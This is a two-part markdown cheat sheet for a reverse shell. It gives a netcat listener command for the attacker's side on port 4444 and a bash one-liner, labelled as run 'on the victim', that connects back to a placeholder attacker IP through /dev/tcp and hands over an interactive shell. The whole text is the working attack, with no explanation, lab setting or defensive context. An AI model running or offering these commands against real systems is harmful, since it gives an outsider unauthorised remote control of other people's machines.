## on the client 
```
nc -lvp 4444
```

## on the victim
```
bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1
```
